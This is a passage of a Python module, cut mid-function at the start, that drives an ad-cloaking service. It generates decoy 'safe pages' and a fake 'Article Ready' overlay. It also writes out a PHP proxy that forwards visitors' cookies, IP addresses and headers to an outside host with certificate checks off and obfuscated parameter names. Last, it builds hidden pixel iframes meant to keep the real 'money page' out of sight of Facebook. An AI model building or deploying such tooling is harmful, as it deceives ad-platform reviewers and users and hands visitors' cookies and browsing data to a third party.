        resp = await client.get(
            f"{BASE_URL}/users", params={"api_key": _api_key()},
        )
        resp.raise_for_status()
        return resp.json()


# ── Location & ORG lookups ───────────────────────────────────────────────────

async def find_location(search: str) -> dict:
    """Search for location IDs (for geo-filtering rules)."""
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.get(
            f"{BASE_URL}/find_location/{search}",
            params={"api_key": _api_key()},
        )
        resp.raise_for_status()
        return resp.json()


async def find_org(search: str) -> dict:
    """Search for ORG/ISP IDs (for click log filtering)."""
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.get(
            f"{BASE_URL}/find_org/{search}",
            params={"api_key": _api_key()},
        )
        resp.raise_for_status()
        return resp.json()


# ── Lists CRUD ───────────────────────────────────────────────────────────────

async def get_lists() -> dict:
    """Get all user lists (IP, UA, referrer blocklists etc)."""
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.get(
            f"{BASE_URL}/lists", params={"api_key": _api_key()},
        )
        resp.raise_for_status()
        return resp.json()


async def get_global_db_lists() -> dict:
    """Get global database lists (shared bot databases)."""
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.get(
            f"{BASE_URL}/lists/global_db", params={"api_key": _api_key()},
        )
        resp.raise_for_status()
        return resp.json()


async def get_list_detail(list_type: str, list_id: int) -> dict:
    """Get details of a specific list."""
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.get(
            f"{BASE_URL}/lists/{list_type}/{list_id}",
            params={"api_key": _api_key()},
        )
        resp.raise_for_status()
        return resp.json()


async def create_list(list_type: str, label: str, content: str) -> dict:
    """Create a new list. Content entries separated by newlines."""
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.post(
            f"{BASE_URL}/lists/{list_type}",
            params={"api_key": _api_key()},
            data={"label": label, "content": content},
        )
        resp.raise_for_status()
        return resp.json()


async def edit_list(list_type: str, list_id: int, label: str, content: str) -> dict:
    """Edit an existing list."""
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.put(
            f"{BASE_URL}/lists/{list_type}/{list_id}",
            params={"api_key": _api_key()},
            data={"label": label, "content": content},
        )
        resp.raise_for_status()
        return resp.json()


# ── Safe Page Injection Helpers ──────────────────────────────────────────────

CONSENT_MODAL_HTML = '''<!-- Continue Overlay (TA cloaking layer) -->
<input type="checkbox" id="cookie-toggle" style="display:none;">
<div class="cookie-overlay" style="position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:9999;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px);">
    <style>#cookie-toggle:checked + .cookie-overlay { display: none !important; }</style>
    <div style="background:#fff;padding:32px 28px;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.2);text-align:center;max-width:90%;width:420px;">
        <div style="font-size:32px;margin-bottom:12px;">&#128240;</div>
        <p style="margin:0 0 8px;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#1a1a1a;font-size:18px;font-weight:600;">Article Ready</p>
        <p style="margin:0 0 24px;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#666;font-size:14px;">Tap below to continue reading</p>
        <label for="cookie-toggle" style="display:inline-block;padding:12px 32px;background:#2563eb;color:white;border-radius:8px;cursor:pointer;font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:15px;font-weight:500;transition:background 0.2s;">Continue to Article &rarr;</label>
    </div>
</div>'''


def get_ta_track_php(campaign_id: str) -> str:
    """Return the TA PHP proxy script content for a specific campaign.

    This is deployed alongside the safe page HTML on cPanel hosting.
    It proxies requests to js-cdn.com and rewrites callback URLs
    to point back to itself on the same domain — no Railway dependency.
    """
    return f'''<?php
    header("Content-Type: application/javascript");
    header("Expires: on, 01 Jan 1970 00:00:00 GMT");
    header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
    header("Cache-Control: no-store, no-cache, must-revalidate");
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Pragma: no-cache");

    $campaignId = $_GET['c'] ?? '{campaign_id}';
    // Build callback URL from this script's actual location on the domain
    $scriptDir = dirname($_SERVER['SCRIPT_NAME']);
    $trackPath = rtrim($scriptDir, '/') . '/track/' . $campaignId;
    $phpUrl = (is_https() ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . $trackPath;

    function is_https() {{
        if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) === 'on') return TRUE;
        if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') return TRUE;
        if (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && $_SERVER['HTTP_FRONT_END_HTTPS'] === 'on') return TRUE;
        return FALSE;
    }}
    function browser_headers() {{
        $headers = array();
        foreach ($_SERVER as $name => $value) {{
            if (preg_match('/^HTTP_/', $name)) $headers[$name] = $value;
        }}
        return $headers;
    }}
    function forward_response_cookies($ch, $headerLine) {{
        if (preg_match('/^Set-Cookie:/mi', $headerLine, $cookie)) header($headerLine, false);
        return strlen($headerLine);
    }}
    function encode_visitor_cookies() {{
        $transmit_string = "";
        foreach ($_COOKIE as $name => $value) {{
            try {{ $transmit_string .= "$name=$value; "; }} catch (Exception $e) {{ continue; }}
        }}
        return $transmit_string;
    }}
    function send_request($url) {{
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_ENCODING, "");
        $headers[] = "API-forwarded-ip: ".$_SERVER['REMOTE_ADDR'];
        $headers[] = "API-forwarded-header: " . json_encode(browser_headers());
        $headers[] = "API-ta-version: 1.0";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADERFUNCTION, "forward_response_cookies");
        if ($_COOKIE) curl_setopt($ch, CURLOPT_COOKIE, encode_visitor_cookies());
        $cloaker_response = curl_exec($ch);
        $curl_error = curl_error($ch);
        $curl_info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($curl_error) error_log("TA track curl error: " . $curl_error . " | URL: " . $url);
        if (empty($cloaker_response)) error_log("TA track empty response | HTTP: " . $curl_info . " | URL: " . $url);
        return $cloaker_response;
    }}

    $postingVarList = [
        "eFQxQTJwUmI=","M1ZqZnNa","dTlCbVg2bjI=","THk4R3d0ek0=","TnBZVzNh",
        "VlhzMGRCTmM=","bVRKenFPMmVp","aDd2TVI1RQ==","ejBVRENpaDlB","S1d5Zko0",
        "UkJMbUFlOQ==","YTJKVGh6Ng==","VWJ4Tmc0","dk05NVl1RA==","Y1pSUE5o",
        "dFhmWXJkdkI=","bkJxVTB5Mw==","cEZ6S3Y1","SGRSVzBFZ2o=","Slh6TTN1aA==",
        "Z1VZNGJhREw=","Wm9WSlhrOQ==","RXJjaXEyTXo=","TVBVanVX","ZFJ4NTBCVHE=",
        "b1poNzJG","UXhmcG1iOQ==","Q1duTHlqWA==","WTVEc1VvaQ==","ZVRVcG5WUg=="
    ];
    function random_posting_var() {{
        global $postingVarList;
        $randomEncoded = $postingVarList[array_rand($postingVarList)];
        return base64_decode($randomEncoded);
    }}

    $finalVarName = "";
    foreach($postingVarList as $varName) {{
        $varName = base64_decode($varName);
        preg_match('|'.$varName.'=([^&]*)|', $_SERVER['REQUEST_URI'], $matches);
        if(!empty($matches[1])) {{ $finalVarName = $matches[1]; break; }}
    }}

    if(!empty($finalVarName)) {{
        $parameters = base64_decode($finalVarName);
        $parameters = json_decode($parameters, true);
        $query_url = "https://js-cdn.com/js/".$campaignId.".js?".random_posting_var()."={{$finalVarName}}";
        $response = send_request($query_url);
    }} else {{
        $query_url = "https://js-cdn.com/js/".$campaignId.".js?version=new";
        $response = send_request($query_url);
        if (preg_match('/atob\\("([^"]+)"\\)/', $response, $matches)) {{
            $base64String = $matches[1];
            $decoded = base64_decode($base64String);
            $modified = str_replace('return t + "?', 'return "' . $phpUrl . '?', $decoded);
            $newBase64 = base64_encode($modified);
            $newJsCode = str_replace($base64String, $newBase64, $response);
            $response = $newJsCode;
        }}
    }}
    echo $response;
    exit;
?>'''


def get_ta_htaccess() -> str:
    """Return .htaccess content for routing /track/{id} to track.php."""
    return '''RewriteEngine On
RewriteRule ^track/(.+)$ track.php?c=$1 [L,QSA]
'''


def inject_ta_code(html: str, ta_campaign_id: str = None,
                   consent_prompt: bool = False,
                   money_page_url: str = None,
                   ta_integration_code: str = None,
                   ftp_subdirectory: str = None) -> str:
    """Inject Traffic Armor integration code into safe page HTML.

    Uses the user-pasted integration code from the TA dashboard when available.
    Falls back to a same-domain script tag pointing to the co-deployed track.php.

    Args:
        html: Safe page HTML to inject into
        ta_campaign_id: TA campaign c8_key/cli_key (fallback)
        consent_prompt: If True, inject the cookie consent modal overlay
        money_page_url: Money page URL (used for consent prompt click handler)
        ta_integration_code: User-pasted code from TA dashboard Integration tab
        ftp_subdirectory: FTP subdirectory path (e.g. "links/abc123") for building script src
    """
    if not html:
        return html

    # Use user-pasted integration code (preferred) or fall back to co-deployed PHP proxy.
    ta_script = ""
    if ta_integration_code:
        code = ta_integration_code
        if ta_campaign_id:
            code = code.replace("{{CAMPAIGN_ID}}", ta_campaign_id)
            code = code.replace("{{ CAMPAIGN_ID }}", ta_campaign_id)
        ta_script = f"\n<!-- Traffic Armor Integration -->\n{code}\n"
    elif ta_campaign_id:
        # Same-domain PHP proxy: track.php is deployed alongside index.html via FTP.
        # The .htaccess rewrites /track/{id} → track.php?c={id}.
        # Script src uses a path relative to the domain root.
        if ftp_subdirectory:
            ta_script = (
                f'\n<!-- Traffic Armor Integration -->\n'
                f'<script src="/{ftp_subdirectory}'
                f'/track/{ta_campaign_id}"></script>\n'
            )
        else:
            ta_script = (
                f'\n<!-- Traffic Armor Integration -->\n'
                f'<script src="/track/{ta_campaign_id}"></script>\n'
            )

    # Inject TA script into <head> (before </head>)
    if ta_script and "</head>" in html:
        html = html.replace("</head>", f"{ta_script}</head>")

    # Inject consent modal before </body> if enabled
    if consent_prompt and "</body>" in html:
        html = html.replace("</body>", f"\n{CONSENT_MODAL_HTML}\n</body>")

    return html


def build_pixel_iframe(pixel_id: str, safe_domain: str, event: str = "PageView") -> str:
    """Build a fake-referrer pixel iframe for FB tracking without leaking money page URL.

    NEVER use FB JavaScript pixels — they leak the money page URL via referrer header.
    Instead: image tag pixels wrapped in an iframe hosted on the safe domain.

    Returns HTML to embed on the money page.
    """
    # The pixel page should be hosted on the safe domain
    pixel_page_url = f"https://{safe_domain}/pixel.html"
    return f'<iframe src="{pixel_page_url}" style="display:none" width="0" height="0"></iframe>'


def build_pixel_page_html(pixel_id: str, events: list[str] = None) -> str:
    """Generate the pixel page HTML to host on the safe domain.

    This page contains FB image tag pixels (NOT JavaScript pixels).
    When loaded in a hidden iframe from the money page, the referrer
    shows the safe domain instead of the money page URL.
    """
    if events is None:
        events = ["PageView"]

    pixel_tags = ""
    for event in events:
        if event == "PageView":
            pixel_tags += f'<img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id={pixel_id}&ev=PageView"/>\n'
        elif event == "Lead":
            pixel_tags += f'<img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id={pixel_id}&ev=Lead&cd[currency]=USD&cd[value]=0.00"/>\n'
        else:
            pixel_tags += f'<img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id={pixel_id}&ev={event}"/>\n'

    return f"""<!DOCTYPE html>
<html><head><title>p</title></head>
<body>{pixel_tags}</body>
</html>"""
